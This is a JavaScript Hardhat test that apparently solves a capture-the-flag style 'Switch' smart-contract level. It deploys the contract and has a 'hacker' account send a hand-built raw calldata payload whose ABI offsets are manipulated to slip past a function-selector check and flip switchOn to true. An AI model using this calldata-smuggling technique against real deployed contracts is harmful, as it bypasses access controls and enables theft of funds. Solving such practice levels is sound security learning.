const { ethers, deployments, waffle } = require("hardhat")
const { deploy } = deployments
const { assert, expect } = require("chai")

describe("Switch Test", () => {
    let deployer, hacker, Switch

    beforeEach(async () => {
        const accounts = await ethers.getSigners()
        deployer = accounts[0]
        hacker = accounts[1]
        await deploy("Switch", {
            from: deployer.address,
            args: [],
        })
        Switch = await ethers.getContract("Switch")
    })
    describe("Initially switch on is false", () => {
        it("Check it", async () => {
            const switchon = await Switch.switchOn()
            assert.equal(switchon.toString(), "false")
        })
    })
    describe("Change switchOn to switch on", () => {
        it("Change", async () => {
            const bypass =
                "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000" 
            await hacker.sendTransaction({from: hacker.address,to: Switch.address, data:bypass,gasLimit: 2000000})
            const switchon = await Switch.switchOn()
            assert.equal(switchon.toString(), "true")
            })
    })
})
